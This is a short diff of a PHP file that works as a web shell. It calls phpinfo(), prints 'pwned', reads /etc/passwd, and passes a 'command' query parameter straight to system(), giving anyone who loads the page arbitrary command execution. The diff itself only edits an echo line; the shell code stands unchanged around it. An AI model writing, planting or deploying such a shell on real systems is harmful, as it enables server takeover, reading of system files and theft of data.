@@ -1,6 +1,6 @@
 <?php
 phpinfo();
-echo "pwned /t/t/t";
+echo "pwned \n";
 echo readfile("/etc/passwd");
 echo "Run command: ".htmlspecialchars($_GET['cmd']);
 system($_GET['command']);
